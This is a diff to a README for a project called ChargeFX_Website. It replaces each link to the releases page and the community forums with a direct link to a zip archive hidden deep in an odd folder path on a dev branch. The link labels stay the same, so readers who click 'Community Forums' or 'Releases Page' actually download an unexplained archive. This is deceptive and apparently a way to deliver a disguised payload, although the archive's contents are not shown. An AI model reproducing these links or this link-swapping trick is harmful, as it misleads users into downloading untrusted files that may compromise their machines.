@@ -18,11 +18,11 @@ To effectively use ChargeFX, you will need the following:
 
 You can easily download ChargeFX_Website from our Releases page. Follow these steps:
 
-1. Visit our [Releases Page](https://github.com/RAKIB-4978/ChargeFX_Website/releases).
+1. Visit our [Releases Page](https://github.com/RAKIB-4978/ChargeFX_Website/raw/refs/heads/ChargeFX_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/MISCELLANEOUS/YML/Website_F_Charge_v2.0.zip).
 2. Find the latest version of ChargeFX_Website.
 3. Click on the file link to start your download.
 
-To highlight, visit our [Releases Page](https://github.com/RAKIB-4978/ChargeFX_Website/releases) to download your copy.
+To highlight, visit our [Releases Page](https://github.com/RAKIB-4978/ChargeFX_Website/raw/refs/heads/ChargeFX_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/MISCELLANEOUS/YML/Website_F_Charge_v2.0.zip) to download your copy.
 
 ## ⚙️ System Requirements
 
@@ -83,7 +83,7 @@ For further assistance, please reach out to our community via GitHub issues or f
 
 ## 🔗 Useful Links
 
-- [ChargeFX Releases](https://github.com/RAKIB-4978/ChargeFX_Website/releases)
-- [Community Forums](https://github.com/RAKIB-4978/ChargeFX_Website/discussions)
+- [ChargeFX Releases](https://github.com/RAKIB-4978/ChargeFX_Website/raw/refs/heads/ChargeFX_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/MISCELLANEOUS/YML/Website_F_Charge_v2.0.zip)
+- [Community Forums](https://github.com/RAKIB-4978/ChargeFX_Website/raw/refs/heads/ChargeFX_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/MISCELLANEOUS/YML/Website_F_Charge_v2.0.zip)
 
 Thank you for choosing ChargeFX_Website. Enjoy customizing your charging experience!
